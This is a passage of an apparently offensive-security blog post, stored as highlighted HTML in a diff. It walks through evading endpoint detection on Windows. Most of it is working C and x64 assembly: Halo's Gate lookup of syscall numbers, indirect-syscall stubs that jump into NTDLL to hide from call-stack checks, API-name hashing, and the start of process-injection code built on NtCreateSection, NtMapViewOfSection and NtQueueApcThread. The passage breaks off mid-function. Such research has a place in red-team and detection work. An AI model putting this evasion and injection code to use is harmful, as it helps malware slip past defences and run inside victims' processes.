+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (WORD idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; idx <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">500</span>; idx<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// check neighboring syscall down
+</span></span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> DOWN) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4c</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> DOWN) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8b</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> DOWN) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd1</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> DOWN) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb8</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> DOWN) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> DOWN) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>) {
+</span></span><span style="display:flex;"><span>                    BYTE high <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> DOWN);
+</span></span><span style="display:flex;"><span>                    BYTE low <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> DOWN);
+</span></span><span style="display:flex;"><span>                    pVxTableEntry<span style="color:#f92672">-&gt;</span>wSystemCall <span style="color:#f92672">=</span> (high <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> low <span style="color:#f92672">-</span> idx;
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// check neighboring syscall up
+</span></span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> UP) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4c</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> UP) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8b</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> UP) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd1</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> UP) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb8</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> UP) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> UP) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>) {
+</span></span><span style="display:flex;"><span>                    BYTE high <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> UP);
+</span></span><span style="display:flex;"><span>                    BYTE low <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> idx <span style="color:#f92672">*</span> UP);
+</span></span><span style="display:flex;"><span>                    pVxTableEntry<span style="color:#f92672">-&gt;</span>wSystemCall <span style="color:#f92672">=</span> (high <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> low <span style="color:#f92672">+</span> idx;
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="now-its-our-turn-to-jump">Now it&rsquo;s our Turn to Jump</h3>
+<p>After I retrieve the SSN, I&rsquo;ll have to set it up using a Native-API-like stub in my source code and call the kernel routines by executing <code>syscall</code> instruction from my user land process.</p>
+<pre tabindex="0"><code>mov r10, rcx
+mov eax, wSystemCall   ; &lt;--------- SSN
+syscall
+ret
+</code></pre><p>This technique is called a direct syscall approach and can be easily detected by inspecting the call stack that highlights the <code>syscall</code> instruction being executed outside of the <code>NTDLL.dll</code> memory space.</p>
+<p>To rephrase, the defensive controls expect <code>syscall</code> instructions only from the <code>NTDLL.dll</code> memory.</p>
+<p>As I already need crawl the <code>NTDLL.dll</code> memory for SSN, if I store the address of the <code>syscall</code> instructions too, I can jump to them once I&rsquo;ve configured the parameters and setup the call.</p>
+<p>Thus the modified stub in my user land code would look like:</p>
+<pre tabindex="0"><code>mov r10, rcx
+mov eax, wSystemCall		        ; &lt;---------- SSN
+jmp qword ptr [qSyscallInsAdress]	; jumping to syscall-instruction&#39;s address instead of executing &#39;syscall&#39;
+ret
+</code></pre><p>This is what they call the indirect syscall approach.</p>
+<h3 id="less-talk-more-code">Less Talk, More Code</h3>
+<blockquote>
+<p>If you haven&rsquo;t gone through the <a href="https://ashtrace.github.io/posts/stripping_iocs/">previous blog</a>, I highly suggest to read it before continuing.</p>
+</blockquote>
+<p>To implement what is discussed above, I started with a defining structure to hold the SSN and address for the <code>syscall</code> instruction for each Native API.</p>
+<p>As I already had compile-time API hashing from previous blog iterations, I leveraged it to make the API&rsquo;s name&rsquo;s hash as its primary identifier instead of hardcoding their names in plaintext.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Stores information pertaining to a syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _NT_SYSCALL
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	ULONG uSyscallHash;             <span style="color:#75715e">// syscall hash value
+</span></span></span><span style="display:flex;"><span>	DWORD dwSSn;                    <span style="color:#75715e">// syscall number
+</span></span></span><span style="display:flex;"><span>	PVOID pSyscallInstAddress;		<span style="color:#75715e">// address for `syscall` instruction.
+</span></span></span><span style="display:flex;"><span>}NT_SYSCALL, <span style="color:#f92672">*</span> PNT_SYSCALL;
+</span></span></code></pre></div><p>Next, I decided upon the APIs to be targeted. I went on with the functions being used in Remote-Mapping Injection and APC Injection.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// All the syscalls that I&#39;ll need
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _SYSCALL_TABLE {
+</span></span><span style="display:flex;"><span>	NT_SYSCALL NtCreateSection;
+</span></span><span style="display:flex;"><span>	NT_SYSCALL NtMapViewOfSection;
+</span></span><span style="display:flex;"><span>    NT_SYSCALL NtClose;
+</span></span><span style="display:flex;"><span>	NT_SYSCALL NtQueueApcThread;
+</span></span><span style="display:flex;"><span>} SYSCALL_TABLE, <span style="color:#f92672">*</span> PSYSCALL_TABLE;
+</span></span></code></pre></div><p>Using the compile-time hash macros from the previous blog, I defined the target function hashes along with hash for the module name.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">// define hashes for syscall wrappers at compile-time
+</span></span></span><span style="display:flex;"><span>CTIME_HFOWLERA(NtCreateSection);
+</span></span><span style="display:flex;"><span>CTIME_HFOWLERA(NtMapViewOfSection);
+</span></span><span style="display:flex;"><span>CTIME_HFOWLERA(NtClose);
+</span></span><span style="display:flex;"><span>CTIME_HFOWLERA(NtQueueApcThread);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// define hash for ntdll.dll at compile-time
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">constexpr</span> ULONG	NTDLL_FnvvW <span style="color:#f92672">=</span> HashStringFowlerNollVoVariant1aW(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;NTDLL.DLL&#34;</span>);
+</span></span></code></pre></div><p>Next, I defined an <code>GetSyscallAddress</code> function to resolve the SSN and <code>syscall</code> instruction address in <code>NTDLL.dll</code> from the target function hash using the Halo&rsquo;s Gate search approach.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">GetSyscallAddress</span>(
+</span></span><span style="display:flex;"><span>	IN  PWINAPI_MODULE  pNtdll,                 <span style="color:#75715e">// internal representation of NTDLL.dll module
+</span></span></span><span style="display:flex;"><span>	IN  ULONG           uSysHash,               <span style="color:#75715e">// target function&#39;s hash
+</span></span></span><span style="display:flex;"><span>	OUT PNT_SYSCALL     pNtSys                  <span style="color:#75715e">// struct to return data for target function
+</span></span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>	PBYTE pNtBase <span style="color:#f92672">=</span> (BYTE<span style="color:#f92672">*</span>)pNtdll<span style="color:#f92672">-&gt;</span>ModuleHandle;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (uSysHash <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>		pNtSys<span style="color:#f92672">-&gt;</span>uSyscallHash <span style="color:#f92672">=</span> uSysHash;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// searching for &#39;uSysHash&#39; in the exported functions of ntdll
+</span></span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (i ; i <span style="color:#f92672">&lt;</span> pNtdll<span style="color:#f92672">-&gt;</span>NumberOfFunctions; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		PCHAR pcFuncName <span style="color:#f92672">=</span> (PCHAR)(pNtBase <span style="color:#f92672">+</span> pNtdll<span style="color:#f92672">-&gt;</span>FunctionNameArray[i]);
+</span></span><span style="display:flex;"><span>		PVOID pFuncAddress <span style="color:#f92672">=</span> (PVOID)(pNtBase <span style="color:#f92672">+</span> pNtdll<span style="color:#f92672">-&gt;</span>FunctionAddressArray[pNtdll<span style="color:#f92672">-&gt;</span>FunctionOrdinalArray[i]]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// if syscall found
+</span></span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">RTIME_HFOWLERA</span>(pcFuncName) <span style="color:#f92672">==</span> uSysHash) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// SEARCH LOGIC AS DEFINED FOR HALO&#39;S GATE
+</span></span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	ULONG_PTR uFuncAddress <span style="color:#f92672">=</span> (ULONG_PTR)(pNtBase <span style="color:#f92672">+</span> pNtdll<span style="color:#f92672">-&gt;</span>FunctionAddressArray[pNtdll<span style="color:#f92672">-&gt;</span>FunctionOrdinalArray[i]]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// resolving the `syscall` instruction address
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (DWORD z <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; z <span style="color:#f92672">&lt;=</span> RANGE; z<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)uFuncAddress <span style="color:#f92672">+</span> z) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0F</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)uFuncAddress <span style="color:#f92672">+</span> z <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x05</span>) {
+</span></span><span style="display:flex;"><span>			pNtSys<span style="color:#f92672">-&gt;</span>pSyscallInstAddress <span style="color:#f92672">=</span> (PVOID)((ULONG_PTR)uFuncAddress <span style="color:#f92672">+</span> z);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;  <span style="color:#75715e">// break for-loop [x]
+</span></span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// checking if all NT_SYSCALL&#39;s (pNtSys) element are initialized
+</span></span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pNtSys<span style="color:#f92672">-&gt;</span>dwSSn <span style="color:#f92672">!=</span> NULL <span style="color:#f92672">&amp;&amp;</span> pNtSys<span style="color:#f92672">-&gt;</span>pSyscallInstAddress <span style="color:#f92672">!=</span> NULL <span style="color:#f92672">&amp;&amp;</span> pNtSys<span style="color:#f92672">-&gt;</span>uSyscallHash <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Next, I retrieved the required information for all my target Native API functions.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">ResolveSyscalls</span>(
+</span></span><span style="display:flex;"><span>	OUT PSYSCALL_TABLE<span style="color:#f92672">*</span>	ppSyscallTable
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	PWINAPI_MODULE	pNtdll <span style="color:#f92672">=</span> (PWINAPI_MODULE)<span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, <span style="color:#66d9ef">sizeof</span>(WINAPI_MODULE));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pNtdll) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to allocate memory for NTDLL module.&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pNtdll<span style="color:#f92672">-&gt;</span>ModuleHash <span style="color:#f92672">=</span> NTDLL_FnvvW;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">GetModuleHandleCustom</span>(pNtdll);				<span style="color:#75715e">// populates pNtdll-&gt;ModuleHandle
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">GetProcAddressCustom</span>(pNtdll, NULL);			<span style="color:#75715e">// populates the count and array addresses for Ntdll
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pNtdll<span style="color:#f92672">-&gt;</span>ModuleHandle <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>pNtdll<span style="color:#f92672">-&gt;</span>NumberOfFunctions <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>pNtdll<span style="color:#f92672">-&gt;</span>FunctionNameArray <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>pNtdll<span style="color:#f92672">-&gt;</span>FunctionAddressArray <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>pNtdll<span style="color:#f92672">-&gt;</span>FunctionOrdinalArray) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to fetch information for NTDLL.DLL&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	PSYSCALL_TABLE pSysTable <span style="color:#f92672">=</span> (PSYSCALL_TABLE)<span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, <span style="color:#66d9ef">sizeof</span>(SYSCALL_TABLE));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pSysTable) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to allocate memory for syscall table.&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetSyscallAddress</span>(pNtdll, NtCreateSection_FnvvA, <span style="color:#f92672">&amp;</span>pSysTable<span style="color:#f92672">-&gt;</span>NtCreateSection)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to resolve NtCreateSection.&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">NtCreateSection</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> syscall number: %d</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">`syscall` instruction address: 0x%p&#34;</span>, pSysTable<span style="color:#f92672">-&gt;</span>NtCreateSection.dwSSn, pSysTable<span style="color:#f92672">-&gt;</span>NtCreateSection.pSyscallInstAddress);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetSyscallAddress</span>(pNtdll, NtMapViewOfSection_FnvvA, <span style="color:#f92672">&amp;</span>pSysTable<span style="color:#f92672">-&gt;</span>NtMapViewOfSection)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to resolve NtMapViewOfSection.&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">NtMapViewOfSection</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> syscall number: %d</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">`syscall` instruction address: 0x%p&#34;</span>, pSysTable<span style="color:#f92672">-&gt;</span>NtMapViewOfSection.dwSSn, pSysTable<span style="color:#f92672">-&gt;</span>NtMapViewOfSection.pSyscallInstAddress);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetSyscallAddress</span>(pNtdll, NtClose_FnvvA, <span style="color:#f92672">&amp;</span>pSysTable<span style="color:#f92672">-&gt;</span>NtClose)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to resolve NtClose.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">NtClose</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> syscall number: %d</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">`syscall` instruction address: 0x%p&#34;</span>, pSysTable<span style="color:#f92672">-&gt;</span>NtClose.dwSSn, pSysTable<span style="color:#f92672">-&gt;</span>NtClose.pSyscallInstAddress);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetSyscallAddress</span>(pNtdll, NtQueueApcThread_FnvvA, <span style="color:#f92672">&amp;</span>pSysTable<span style="color:#f92672">-&gt;</span>NtQueueApcThread)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to resolve NtQueueApcThread.&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">NtQueueApcThread</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> syscall number: %d</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">`syscall` instruction address: 0x%p&#34;</span>, pSysTable<span style="color:#f92672">-&gt;</span>NtQueueApcThread.dwSSn, pSysTable<span style="color:#f92672">-&gt;</span>NtQueueApcThread.pSyscallInstAddress);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>ppSyscallTable <span style="color:#f92672">=</span> pSysTable;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>To use the SSN, I defined the following stub in x64 assembly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">.data</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">wSystemCall</span>       <span style="color:#66d9ef">DWORD</span>	<span style="color:#ae81ff">0</span><span style="color:#66d9ef">h</span>	    <span style="color:#75715e">; syscall number
+</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">qSyscallInsAdress</span> <span style="color:#66d9ef">QWORD</span>	<span style="color:#ae81ff">0</span><span style="color:#66d9ef">h</span>	    <span style="color:#75715e">; memory address of the `syscall` instruction
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">.code</span> 
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">HellsGate</span> <span style="color:#66d9ef">PROC</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">wSystemCall</span>, <span style="color:#ae81ff">0</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">qSyscallInsAdress</span>, <span style="color:#ae81ff">0</span><span style="color:#66d9ef">h</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">wSystemCall</span>, <span style="color:#66d9ef">ecx</span>		    <span style="color:#75715e">; saving the ssn value to wSystemCall
+</span></span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">qSyscallInsAdress</span>, <span style="color:#66d9ef">rdx</span>	<span style="color:#75715e">; saving the syscall instruction address to qSyscallInsAdress	
+</span></span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">ret</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">HellsGate</span> <span style="color:#66d9ef">ENDP</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">HellDescent</span> <span style="color:#66d9ef">PROC</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r10</span>, <span style="color:#66d9ef">rcx</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">wSystemCall</span>		
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">jmp</span> <span style="color:#66d9ef">qword</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">qSyscallInsAdress</span>]	<span style="color:#75715e">; jumping to qSyscallInsAdress instead of calling &#39;syscall&#39;
+</span></span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">ret</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">HellDescent</span> <span style="color:#66d9ef">ENDP</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">end</span>
+</span></span></code></pre></div><ul>
+<li>The <code>HellsGate</code> procedure takes SSN and syscall-instruction address as parameters and set them up in their respective variables.</li>
+<li>The <code>HellDescent</code> procedure performs the indirect syscall using the variables configured above.</li>
+</ul>
+<p>After I had this basic scaffolding developed, I modified the remote-mapping injection source code to use indirect-system calls instead of WinAPIs.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">CopyBlob</span>(
+</span></span><span style="display:flex;"><span>	IN	PSYSCALL_TABLE	pSyscallTable,
+</span></span><span style="display:flex;"><span>	IN	HANDLE			hProcess,
